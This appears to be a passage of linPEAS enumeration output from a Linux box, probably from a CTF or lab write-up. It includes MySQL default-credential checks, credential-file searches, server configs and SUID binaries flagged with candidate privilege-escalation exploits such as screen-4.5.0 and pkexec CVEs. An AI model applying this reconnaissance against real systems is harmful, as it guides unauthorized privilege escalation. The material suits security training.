LOGIN@   IDLE   JCPU   PCPU WHAT<br><br>╔══════════╣ Last logons<br>                                                                                         <br>wtmp begins Wed Jan  3 09:22:08 2024<br><br>╔══════════╣ Last time logon each user<br>Username         Port     From             Latest                                        <br>root             tty1                      Tue Jan  4 20:35:20 +0100 2022<br>maria            tty1                      Tue Jul 13 10:40:22 +0200 2021<br><br>╔══════════╣ Do not forget to <span class="hljs-built_in">test</span> <span class="hljs-string">&#x27;su&#x27;</span> as any other user with shell: without password and with their names as password (I don<span class="hljs-string">&#x27;t do it in FAST mode...)                           </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">╔══════════╣ Do not forget to execute &#x27;</span>sudo -l<span class="hljs-string">&#x27; without password or with valid password (if you know it)!!                                                                        </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">                             ╔══════════════════════╗</span><br><span class="hljs-string">═════════════════════════════╣ Software Information ╠═════════════════════════════       </span><br><span class="hljs-string">                             ╚══════════════════════╝                                    </span><br><span class="hljs-string">╔══════════╣ Useful software</span><br><span class="hljs-string">/usr/bin/base64                                                                          </span><br><span class="hljs-string">/usr/bin/curl</span><br><span class="hljs-string">/usr/bin/gcc</span><br><span class="hljs-string">/usr/bin/lxc</span><br><span class="hljs-string">/usr/bin/make</span><br><span class="hljs-string">/bin/nc</span><br><span class="hljs-string">/bin/nc.traditional</span><br><span class="hljs-string">/bin/netcat</span><br><span class="hljs-string">/usr/bin/perl</span><br><span class="hljs-string">/usr/bin/php</span><br><span class="hljs-string">/bin/ping</span><br><span class="hljs-string">/usr/bin/python3</span><br><span class="hljs-string">/usr/bin/sudo</span><br><span class="hljs-string">/usr/bin/wget</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Installed Compilers</span><br><span class="hljs-string">ii  gcc                                4:5.3.1-1ubuntu1                           amd64        GNU C compiler</span><br><span class="hljs-string">ii  gcc-5                              5.4.0-6ubuntu1~16.04.4                     amd64        GNU C compiler</span><br><span class="hljs-string">/usr/bin/gcc</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ MySQL version</span><br><span class="hljs-string">mysql  Ver 14.14 Distrib 5.7.18, for Linux (x86_64) using  EditLine wrapper              </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">═╣ MySQL connection using default root/root ........... No</span><br><span class="hljs-string">═╣ MySQL connection using root/toor ................... No                               </span><br><span class="hljs-string">═╣ MySQL connection using root/NOPASS ................. No                               </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">╔══════════╣ Searching mysql credentials and exec</span><br><span class="hljs-string">From &#x27;</span>/etc/mysql/mysql.conf.d/mysqld.cnf<span class="hljs-string">&#x27; Mysql user: user              = mysql          </span><br><span class="hljs-string">Found readable /etc/mysql/my.cnf</span><br><span class="hljs-string">!includedir /etc/mysql/conf.d/</span><br><span class="hljs-string">!includedir /etc/mysql/mysql.conf.d/</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing MariaDB Files (limit 70)</span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">-rw------- 1 root root 317 May 16  2017 /etc/mysql/debian.cnf</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing Apache-Nginx Files (limit 70)</span><br><span class="hljs-string">Apache version: apache2 Not Found                                                        </span><br><span class="hljs-string">httpd Not Found                                                                          </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">Nginx version: </span><br><span class="hljs-string">══╣ PHP exec extensions</span><br><span class="hljs-string">drwxr-xr-x 2 root root 4096 May 16  2017 /etc/nginx/sites-enabled                        </span><br><span class="hljs-string">drwxr-xr-x 2 root root 4096 May 16  2017 /etc/nginx/sites-enabled</span><br><span class="hljs-string">lrwxrwxrwx 1 root root 34 May 16  2017 /etc/nginx/sites-enabled/default -&gt; /etc/nginx/sites-available/default                                                                     </span><br><span class="hljs-string">server &#123;</span><br><span class="hljs-string">        listen 80 default_server;</span><br><span class="hljs-string">        listen [::]:80 default_server;</span><br><span class="hljs-string">        root /var/www/html;</span><br><span class="hljs-string">        index index.html index.htm index.nginx-debian.html;</span><br><span class="hljs-string">        server_name _;</span><br><span class="hljs-string">        location / &#123;</span><br><span class="hljs-string">                try_files $uri $uri/ =404;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">        location ~ \.php$ &#123;</span><br><span class="hljs-string">                include snippets/fastcgi-php.conf;</span><br><span class="hljs-string">                fastcgi_pass unix:/run/php/php7.0-fpm.sock;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">-rw-r--r-- 1 root root 70575 Mar  2  2017 /etc/php/7.0/cli/php.ini</span><br><span class="hljs-string">allow_url_fopen = On</span><br><span class="hljs-string">allow_url_include = Off</span><br><span class="hljs-string">odbc.allow_persistent = On</span><br><span class="hljs-string">ibase.allow_persistent = 1</span><br><span class="hljs-string">mysqli.allow_persistent = On</span><br><span class="hljs-string">pgsql.allow_persistent = On</span><br><span class="hljs-string">-rw-r--r-- 1 root root 70918 Mar  2  2017 /etc/php/7.0/fpm/php.ini</span><br><span class="hljs-string">allow_url_fopen = On</span><br><span class="hljs-string">allow_url_include = Off</span><br><span class="hljs-string">odbc.allow_persistent = On</span><br><span class="hljs-string">ibase.allow_persistent = 1</span><br><span class="hljs-string">mysqli.allow_persistent = On</span><br><span class="hljs-string">pgsql.allow_persistent = On</span><br><span class="hljs-string"></span><br><span class="hljs-string">-rw-r--r-- 1 root root 401 Apr 26  2016 /etc/init/nginx.conf</span><br><span class="hljs-string">description &quot;nginx - small, powerful, scalable web/proxy server&quot;</span><br><span class="hljs-string">start on filesystem and static-network-up</span><br><span class="hljs-string">stop on runlevel [016]</span><br><span class="hljs-string">expect fork</span><br><span class="hljs-string">respawn</span><br><span class="hljs-string">pre-start script</span><br><span class="hljs-string">        [ -x /usr/sbin/nginx ] || &#123; stop; exit 0; &#125;</span><br><span class="hljs-string">        /usr/sbin/nginx -q -t -g &#x27;</span>daemon on; master_process on;<span class="hljs-string">&#x27; || &#123; stop; exit 0; &#125;</span><br><span class="hljs-string">end script</span><br><span class="hljs-string">exec /usr/sbin/nginx -g &#x27;</span>daemon on; master_process on;<span class="hljs-string">&#x27;</span><br><span class="hljs-string">pre-stop exec /usr/sbin/nginx -s quit</span><br><span class="hljs-string">-rw-r--r-- 1 root root 1462 Apr 26  2016 /etc/nginx/nginx.conf</span><br><span class="hljs-string">user www-data;</span><br><span class="hljs-string">worker_processes auto;</span><br><span class="hljs-string">pid /run/nginx.pid;</span><br><span class="hljs-string">events &#123;</span><br><span class="hljs-string">        worker_connections 768;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">http &#123;</span><br><span class="hljs-string">        sendfile on;</span><br><span class="hljs-string">        tcp_nopush on;</span><br><span class="hljs-string">        tcp_nodelay on;</span><br><span class="hljs-string">        keepalive_timeout 65;</span><br><span class="hljs-string">        types_hash_max_size 2048;</span><br><span class="hljs-string">        include /etc/nginx/mime.types;</span><br><span class="hljs-string">        default_type application/octet-stream;</span><br><span class="hljs-string">        ssl_prefer_server_ciphers on;</span><br><span class="hljs-string">        access_log /var/log/nginx/access.log;</span><br><span class="hljs-string">        error_log /var/log/nginx/error.log;</span><br><span class="hljs-string">        gzip on;</span><br><span class="hljs-string">        gzip_disable &quot;msie6&quot;;</span><br><span class="hljs-string">        include /etc/nginx/conf.d/*.conf;</span><br><span class="hljs-string">        include /etc/nginx/sites-enabled/*;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">-rw-r--r-- 1 root root 389 Apr 26  2016 /etc/default/nginx</span><br><span class="hljs-string"></span><br><span class="hljs-string">-rwxr-xr-x 1 root root 4579 Apr 26  2016 /etc/init.d/nginx</span><br><span class="hljs-string"></span><br><span class="hljs-string">-rw-r--r-- 1 root root 329 Apr 26  2016 /etc/logrotate.d/nginx</span><br><span class="hljs-string"></span><br><span class="hljs-string">drwxr-xr-x 6 root root 4096 May 16  2017 /etc/nginx</span><br><span class="hljs-string">-rw-r--r-- 1 root root 422 Apr 26  2016 /etc/nginx/snippets/fastcgi-php.conf</span><br><span class="hljs-string">fastcgi_split_path_info ^(.+\.php)(/.+)$;</span><br><span class="hljs-string">try_files $fastcgi_script_name =404;</span><br><span class="hljs-string">set $path_info $fastcgi_path_info;</span><br><span class="hljs-string">fastcgi_param PATH_INFO $path_info;</span><br><span class="hljs-string">fastcgi_index index.php;</span><br><span class="hljs-string">include fastcgi.conf;</span><br><span class="hljs-string">-rw-r--r-- 1 root root 217 Apr 26  2016 /etc/nginx/snippets/snakeoil.conf</span><br><span class="hljs-string">ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;</span><br><span class="hljs-string">ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;</span><br><span class="hljs-string">-rw-r--r-- 1 root root 1462 Apr 26  2016 /etc/nginx/nginx.conf</span><br><span class="hljs-string">user www-data;</span><br><span class="hljs-string">worker_processes auto;</span><br><span class="hljs-string">pid /run/nginx.pid;</span><br><span class="hljs-string">events &#123;</span><br><span class="hljs-string">        worker_connections 768;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">http &#123;</span><br><span class="hljs-string">        sendfile on;</span><br><span class="hljs-string">        tcp_nopush on;</span><br><span class="hljs-string">        tcp_nodelay on;</span><br><span class="hljs-string">        keepalive_timeout 65;</span><br><span class="hljs-string">        types_hash_max_size 2048;</span><br><span class="hljs-string">        include /etc/nginx/mime.types;</span><br><span class="hljs-string">        default_type application/octet-stream;</span><br><span class="hljs-string">        ssl_prefer_server_ciphers on;</span><br><span class="hljs-string">        access_log /var/log/nginx/access.log;</span><br><span class="hljs-string">        error_log /var/log/nginx/error.log;</span><br><span class="hljs-string">        gzip on;</span><br><span class="hljs-string">        gzip_disable &quot;msie6&quot;;</span><br><span class="hljs-string">        include /etc/nginx/conf.d/*.conf;</span><br><span class="hljs-string">        include /etc/nginx/sites-enabled/*;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">-rw-r--r-- 1 root root 1077 Apr 26  2016 /etc/nginx/fastcgi.conf</span><br><span class="hljs-string">fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</span><br><span class="hljs-string">fastcgi_param  QUERY_STRING       $query_string;</span><br><span class="hljs-string">fastcgi_param  REQUEST_METHOD     $request_method;</span><br><span class="hljs-string">fastcgi_param  CONTENT_TYPE       $content_type;</span><br><span class="hljs-string">fastcgi_param  CONTENT_LENGTH     $content_length;</span><br><span class="hljs-string">fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;</span><br><span class="hljs-string">fastcgi_param  REQUEST_URI        $request_uri;</span><br><span class="hljs-string">fastcgi_param  DOCUMENT_URI       $document_uri;</span><br><span class="hljs-string">fastcgi_param  DOCUMENT_ROOT      $document_root;</span><br><span class="hljs-string">fastcgi_param  SERVER_PROTOCOL    $server_protocol;</span><br><span class="hljs-string">fastcgi_param  REQUEST_SCHEME     $scheme;</span><br><span class="hljs-string">fastcgi_param  HTTPS              $https if_not_empty;</span><br><span class="hljs-string">fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;</span><br><span class="hljs-string">fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;</span><br><span class="hljs-string">fastcgi_param  REMOTE_ADDR        $remote_addr;</span><br><span class="hljs-string">fastcgi_param  REMOTE_PORT        $remote_port;</span><br><span class="hljs-string">fastcgi_param  SERVER_ADDR        $server_addr;</span><br><span class="hljs-string">fastcgi_param  SERVER_PORT        $server_port;</span><br><span class="hljs-string">fastcgi_param  SERVER_NAME        $server_name;</span><br><span class="hljs-string">fastcgi_param  REDIRECT_STATUS    200;</span><br><span class="hljs-string"></span><br><span class="hljs-string">-rw-r--r-- 1 root root 374 Apr 26  2016 /etc/ufw/applications.d/nginx</span><br><span class="hljs-string"></span><br><span class="hljs-string">-rwxr-xr-x 1 root root 1230448 Oct 27  2016 /usr/sbin/nginx</span><br><span class="hljs-string"></span><br><span class="hljs-string">drwxr-xr-x 2 root root 4096 Jul 13  2021 /usr/share/doc/nginx</span><br><span class="hljs-string"></span><br><span class="hljs-string">drwxr-xr-x 3 root root 4096 Jul 13  2021 /usr/share/nginx</span><br><span class="hljs-string"></span><br><span class="hljs-string">drwxr-xr-x 7 root root 4096 May 16  2017 /var/lib/nginx</span><br><span class="hljs-string"></span><br><span class="hljs-string">drwxr-xr-x 2 root adm 4096 Jan  3 09:22 /var/log/nginx</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing FastCGI Files (limit 70)</span><br><span class="hljs-string">-rw-r--r-- 1 root root 1007 Apr 26  2016 /etc/nginx/fastcgi_params                       </span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing Rsync Files (limit 70)</span><br><span class="hljs-string">-rw-r--r-- 1 root root 1044 Sep 30  2013 /usr/share/doc/rsync/examples/rsyncd.conf       </span><br><span class="hljs-string">[ftp]</span><br><span class="hljs-string">        comment = public archive</span><br><span class="hljs-string">        path = /var/www/pub</span><br><span class="hljs-string">        use chroot = yes</span><br><span class="hljs-string">        lock file = /var/lock/rsyncd</span><br><span class="hljs-string">        read only = yes</span><br><span class="hljs-string">        list = yes</span><br><span class="hljs-string">        uid = nobody</span><br><span class="hljs-string">        gid = nogroup</span><br><span class="hljs-string">        strict modes = yes</span><br><span class="hljs-string">        ignore errors = no</span><br><span class="hljs-string">        ignore nonreadable = yes</span><br><span class="hljs-string">        transfer logging = no</span><br><span class="hljs-string">        timeout = 600</span><br><span class="hljs-string">        refuse options = checksum dry-run</span><br><span class="hljs-string">        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing Ldap Files (limit 70)</span><br><span class="hljs-string">The password hash is from the &#123;SSHA&#125; to &#x27;</span>structural<span class="hljs-string">&#x27;                                     </span><br><span class="hljs-string">drwxr-xr-x 2 root root 4096 May 15  2017 /etc/ldap</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Searching ssl/ssh files</span><br><span class="hljs-string">╔══════════╣ Analyzing SSH Files (limit 70)                                              </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">-rw-r--r-- 1 root root 602 May 22  2017 /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="hljs-string">-rw-r--r-- 1 root root 174 May 22  2017 /etc/ssh/ssh_host_ecdsa_key.pub</span><br><span class="hljs-string">-rw-r--r-- 1 root root 94 May 22  2017 /etc/ssh/ssh_host_ed25519_key.pub</span><br><span class="hljs-string">-rw-r--r-- 1 root root 394 May 22  2017 /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="hljs-string"></span><br><span class="hljs-string">Port 22</span><br><span class="hljs-string">PermitRootLogin prohibit-password</span><br><span class="hljs-string">PubkeyAuthentication yes</span><br><span class="hljs-string">PermitEmptyPasswords no</span><br><span class="hljs-string">ChallengeResponseAuthentication no</span><br><span class="hljs-string">UsePAM yes</span><br><span class="hljs-string">══╣ Some certificates were found (out limited):</span><br><span class="hljs-string">/etc/ssl/certs/ACCVRAIZ1.pem                                                             </span><br><span class="hljs-string">/etc/ssl/certs/ACEDICOM_Root.pem</span><br><span class="hljs-string">/etc/ssl/certs/AC_Raíz_Certicámara_S.A..pem</span><br><span class="hljs-string">/etc/ssl/certs/Actalis_Authentication_Root_CA.pem</span><br><span class="hljs-string">/etc/ssl/certs/AddTrust_External_Root.pem</span><br><span class="hljs-string">/etc/ssl/certs/AddTrust_Low-Value_Services_Root.pem</span><br><span class="hljs-string">/etc/ssl/certs/AddTrust_Public_Services_Root.pem</span><br><span class="hljs-string">/etc/ssl/certs/AddTrust_Qualified_Certificates_Root.pem</span><br><span class="hljs-string">/etc/ssl/certs/AffirmTrust_Commercial.pem</span><br><span class="hljs-string">/etc/ssl/certs/AffirmTrust_Networking.pem</span><br><span class="hljs-string">/etc/ssl/certs/AffirmTrust_Premium.pem</span><br><span class="hljs-string">/etc/ssl/certs/AffirmTrust_Premium_ECC.pem</span><br><span class="hljs-string">/etc/ssl/certs/ApplicationCA_-_Japanese_Government.pem</span><br><span class="hljs-string">/etc/ssl/certs/Atos_TrustedRoot_2011.pem</span><br><span class="hljs-string">/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem</span><br><span class="hljs-string">/etc/ssl/certs/Baltimore_CyberTrust_Root.pem</span><br><span class="hljs-string">/etc/ssl/certs/Buypass_Class_2_CA_1.pem</span><br><span class="hljs-string">/etc/ssl/certs/Buypass_Class_2_Root_CA.pem</span><br><span class="hljs-string">/etc/ssl/certs/Buypass_Class_3_Root_CA.pem</span><br><span class="hljs-string">/etc/ssl/certs/CA_Disig.pem</span><br><span class="hljs-string">4136PSTORAGE_CERTSBIN</span><br><span class="hljs-string"></span><br><span class="hljs-string">══╣ Some home ssh config file was found</span><br><span class="hljs-string">/usr/share/doc/openssh-client/examples/sshd_config                                       </span><br><span class="hljs-string">AuthorizedKeysFile      .ssh/authorized_keys</span><br><span class="hljs-string">Subsystem       sftp    /usr/lib/openssh/sftp-server</span><br><span class="hljs-string"></span><br><span class="hljs-string">══╣ /etc/hosts.allow file found, trying to read the rules:</span><br><span class="hljs-string">/etc/hosts.allow                                                                         </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Searching inside /etc/ssh/ssh_config for interesting info</span><br><span class="hljs-string">Host *</span><br><span class="hljs-string">    SendEnv LANG LC_*</span><br><span class="hljs-string">    HashKnownHosts yes</span><br><span class="hljs-string">    GSSAPIAuthentication yes</span><br><span class="hljs-string">    GSSAPIDelegateCredentials no</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing PAM Auth Files (limit 70)</span><br><span class="hljs-string">drwxr-xr-x 2 root root 4096 May 22  2017 /etc/pam.d                                      </span><br><span class="hljs-string">-rw-r--r-- 1 root root 2133 Mar 16  2017 /etc/pam.d/sshd</span><br><span class="hljs-string">account    required     pam_nologin.so</span><br><span class="hljs-string">session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close</span><br><span class="hljs-string">session    required     pam_loginuid.so</span><br><span class="hljs-string">session    optional     pam_keyinit.so force revoke</span><br><span class="hljs-string">session    optional     pam_motd.so  motd=/run/motd.dynamic</span><br><span class="hljs-string">session    optional     pam_motd.so noupdate</span><br><span class="hljs-string">session    optional     pam_mail.so standard noenv # [1]</span><br><span class="hljs-string">session    required     pam_limits.so</span><br><span class="hljs-string">session    required     pam_env.so # [1]</span><br><span class="hljs-string">session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale</span><br><span class="hljs-string">session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Passwords inside pam.d</span><br><span class="hljs-string">/etc/pam.d/lightdm:auth    sufficient      pam_succeed_if.so user ingroup nopasswdlogin  </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Searching tmux sessions</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions   </span><br><span class="hljs-string">tmux 2.1                                                                                 </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">/tmp/tmux-33</span><br><span class="hljs-string">╔══════════╣ Analyzing Keyring Files (limit 70)</span><br><span class="hljs-string">drwxr-xr-x 2 root root 4096 May 15  2017 /usr/share/keyrings                             </span><br><span class="hljs-string">drwxr-xr-x 2 root root 4096 May 15  2017 /var/lib/apt/keyrings</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Searching uncommon passwd files (splunk)</span><br><span class="hljs-string">passwd file: /etc/pam.d/passwd                                                           </span><br><span class="hljs-string">passwd file: /etc/passwd</span><br><span class="hljs-string">passwd file: /usr/share/bash-completion/completions/passwd</span><br><span class="hljs-string">passwd file: /usr/share/lintian/overrides/passwd</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing PGP-GPG Files (limit 70)</span><br><span class="hljs-string">/usr/bin/gpg                                                                             </span><br><span class="hljs-string">gpg Not Found</span><br><span class="hljs-string">netpgpkeys Not Found                                                                     </span><br><span class="hljs-string">netpgp Not Found                                                                         </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">-rw-r--r-- 1 root root 12255 Feb 15  2017 /etc/apt/trusted.gpg</span><br><span class="hljs-string">-rw-r--r-- 1 root root 364 May 16  2017 /etc/apt/trusted.gpg.d/ondrej_ubuntu_mysql-5_5.gpg                                                                                        </span><br><span class="hljs-string">-rw-r--r-- 1 root root 12335 May 19  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg</span><br><span class="hljs-string">-rw-r--r-- 1 root root 0 May 19  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg</span><br><span class="hljs-string">-rw-r--r-- 1 root root 0 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring-removed.gpg</span><br><span class="hljs-string">-rw-r--r-- 1 root root 2294 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg                                                                                        </span><br><span class="hljs-string">-rw-r--r-- 1 root root 1227 May 19  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg</span><br><span class="hljs-string">-rw-r--r-- 1 root root 2256 Feb 26  2016 /usr/share/popularity-contest/debian-popcon.gpg</span><br><span class="hljs-string">-rw-r--r-- 1 root root 12335 Feb 15  2017 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg                                                                                        </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing Postfix Files (limit 70)</span><br><span class="hljs-string">-rw-r--r-- 1 root root 694 May 18  2016 /usr/share/bash-completion/completions/postfix   </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing FTP Files (limit 70)</span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">-rw-r--r-- 1 root root 69 Mar  2  2017 /etc/php/7.0/mods-available/ftp.ini</span><br><span class="hljs-string">-rw-r--r-- 1 root root 69 Mar  2  2017 /usr/share/php7.0-common/common/ftp.ini</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing X11 Files (limit 70)</span><br><span class="hljs-string">-rw------- 1 maria maria 52 May 16  2017 /home/maria/.Xauthority                         </span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing Interesting logs Files (limit 70)</span><br><span class="hljs-string">-rw-r----- 1 www-data adm 8655346 Jan  3 10:19 /var/log/nginx/access.log                 </span><br><span class="hljs-string"></span><br><span class="hljs-string">-rw-r----- 1 www-data adm 5086 Jan  3 10:19 /var/log/nginx/error.log</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing Windows Files (limit 70)</span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">lrwxrwxrwx 1 root root 20 May 16  2017 /etc/alternatives/my.cnf -&gt; /etc/mysql/mysql.cnf</span><br><span class="hljs-string">lrwxrwxrwx 1 root root 24 May 16  2017 /etc/mysql/my.cnf -&gt; /etc/alternatives/my.cnf</span><br><span class="hljs-string">-rw-r--r-- 1 root root 81 May 16  2017 /var/lib/dpkg/alternatives/my.cnf</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing Other Interesting Files (limit 70)</span><br><span class="hljs-string">-rw-r--r-- 1 root root 3771 Sep  1  2015 /etc/skel/.bashrc                               </span><br><span class="hljs-string">-rw-r--r-- 1 maria maria 3771 May 15  2017 /home/maria/.bashrc</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">-rw-r--r-- 1 root root 655 Jun 24  2016 /etc/skel/.profile</span><br><span class="hljs-string">-rw-r--r-- 1 maria maria 655 May 15  2017 /home/maria/.profile</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">-rw-r--r-- 1 maria maria 0 May 16  2017 /home/maria/.sudo_as_admin_successful</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">                      ╔════════════════════════════════════╗</span><br><span class="hljs-string">══════════════════════╣ Files with Interesting Permissions ╠══════════════════════       </span><br><span class="hljs-string">                      ╚════════════════════════════════════╝                             </span><br><span class="hljs-string">╔══════════╣ SUID - Check easy privesc, exploits and write perms</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid         </span><br><span class="hljs-string">-rwsr-xr-x 1 root root 139K Jan 28  2017 /bin/ntfs-3g  ---&gt;  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)                                             </span><br><span class="hljs-string">-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 40K May  4  2017 /bin/su</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 40K Dec 16  2016 /bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                           </span><br><span class="hljs-string">-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 27K Dec 16  2016 /bin/umount  ---&gt;  BSD/Linux(08-1996)</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 134K Jan 20  2017 /usr/bin/sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable                                                                             </span><br><span class="hljs-string">-rwsr-xr-x 1 root root 23K Jan 18  2016 /usr/bin/pkexec  ---&gt;  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                                                          </span><br><span class="hljs-string">-rwsr-xr-x 1 root root 33K May  4  2017 /usr/bin/newuidmap</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 39K May  4  2017 /usr/bin/newgrp  ---&gt;  HP-UX_10.20</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 33K May  4  2017 /usr/bin/newgidmap</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 74K May  4  2017 /usr/bin/gpasswd</span><br><span class="hljs-string">-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  ---&gt;  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                                    </span><br><span class="hljs-string">-rwsr-xr-x 1 root root 53K May  4  2017 /usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                            </span><br><span class="hljs-string">-rwsr-xr-x 1 root root 1.6M May 19  2017 /usr/bin/screen-4.5.0 (Unknown SUID binary!)</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 40K May  4  2017 /usr/bin/chsh</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 49K May  4  2017 /usr/bin/chfn  ---&gt;  SuSE_9.3/10</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 39K Mar  7  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="hljs-string">-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span 